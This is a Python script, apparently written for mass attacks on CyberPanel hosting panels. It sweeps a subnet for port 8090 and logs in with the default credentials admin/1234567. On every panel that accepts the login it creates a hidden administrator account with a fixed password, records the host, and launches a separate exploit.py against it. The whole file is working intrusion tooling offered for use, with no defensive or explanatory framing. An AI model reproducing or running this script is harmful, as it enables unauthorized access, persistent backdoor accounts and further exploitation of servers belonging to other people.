import socket
import ipaddress
import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style
import os
import argparse
import subprocess
import mysql.connector
config = {
    'host': 'localhost',
    'user': 'ozh',
    'password': 'ozh',
    'database': 'soz',
}



requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # You can set the timeout duration (in seconds)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

def main(subnet):

    ip_network = ipaddress.IPv4Network(subnet)
    port = 8090
    print(Fore.YELLOW + "[+] Selected subnet : " + str(subnet) +Style.RESET_ALL)

    with open("acik_ip.txt", "w") as file:
        while True:
            for ip in ip_network:
                ip_str = str(ip)
                try:
                    if check_port(ip_str, port):
                        session = requests.Session()
                        target = "https://"+str(ip)+str(":8090")
                        username = "admin"
                        password = "1234567"
                        print(Fore.BLUE + "[+] " + str(target) +Style.RESET_ALL)
                        print(Fore.BLUE + "[+] Try login : " + str(ip) +Style.RESET_ALL)

             
                        session = requests.Session()
                        target = "https://"+str(ip)+str(":8090")
                        response = session.get(target, verify=False)
                        session_hand = session.cookies.get_dict()
                        token = session_hand["csrftoken"]

                        print("[+] Token {}".format(token))

                        headers = {
                            'X-Csrftoken': token,
                            'Cookie': 'csrftoken={}'.format(token),
                            'Referer': target
                        }

                        login = session.post(target + "/verifyLogin", headers=headers, verify=False, json={
                            "username": username,
                            "password": password,
                            "languageSelection": "english"
                        })
                        login_json = json.loads(login.content)


                        if login_json["loginStatus"] == 2:
                            print(Fore.YELLOW + "[+] 2FA required" + Style.RESET_ALL)
                            # Diğer işlemlere geçiş
                        elif login_json["loginStatus"] == 1:
                            session_hand_login = session.cookies.get_dict()
                            print(Fore.GREEN + "[+] Login Successful " + str(target) + Style.RESET_ALL)
                            with open('PANELLER.txt', 'a') as cikis:
                                cikis.write(target + "\n")
                                print(Fore.GREEN + "[+] Saved " + str(target) + Style.RESET_ALL)
                            session_hand_login = session.cookies.get_dict()
                            headers = {
                                'X-Csrftoken': session_hand_login["csrftoken"],
                                'Cookie': 'csrftoken={};sessionid={}'.format(token, session_hand_login["sessionid"]),
                                'Referer': target
                            }
                            
                            print(Fore.BLUE + "[+] Creating user "+ Style.RESET_ALL)
                            
                            user_data = {
                                "email": "cyberpanel@cyberpanel.com",
                                "firstName": "Cyber Panel",
                                "lastName": "Cyber Panel",
                                "password": "Osho2004_",
                                "securityLevel": "HIGH",
                                "selectedACL": "admin",
                                "userName": "CyberPanel",
                                "websitesLimit": 0
                            }
                            
                            create_user_url = target + "/users/submitUserCreation"
                            response = session.post(create_user_url, headers=headers, verify=False, json=user_data)

                            if response.status_code == 200:
                                print(Fore.GREEN + "[+] User created" + Style.RESET_ALL)
                                veri = ip
                                
                                
                                file_path = 'ozh.txt'
                                target_string = str(ip)
                                match_found = False

                                with open(file_path, 'r') as file:
                                    for line in file:
                                        if target_string in line:
                                            match_found = True

                                if match_found:
                                    print(Fore.CYAN + "[+]ZATEN VAR" + Style.RESET_ALL)
                                else:
                                    print(Fore.CYAN + "[+] PROCESS STARTED" + Style.RESET_ALL)
                                    exp_cmd = "start cmd /c py exploit.py --target " + str(target)
                                    subprocess.Popen(exp_cmd, shell=True)
                                    
                                    
                                    
                                    
                                
                                
                                        
                         
                                
                                
                                
                                
                                        

                                
                                
                                
                                
                                
                            else:
                                print(Fore.RED + "[+] User error" + Style.RESET_ALL)
                                
                                

                

                                    
                                
                                
                                
                                    
                                    
                        else:
                            print(Fore.RED + "[+] Wrong password " + str(target) + Style.RESET_ALL)

                    else:
                        print(Fore.WHITE + "[+] " + str(ip) +Style.RESET_ALL)

                except Exception as e:
                    print(e)
                    print(Fore.RED + "[+] Error " + str(ip) +Style.RESET_ALL)
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--subnet", help="Specify the subnet")
    args = parser.parse_args()

    if args.subnet:
        main(args.subnet)
    else:
        print(Fore.RED + "[+] Subnet not provided!" + Style.RESET_ALL)

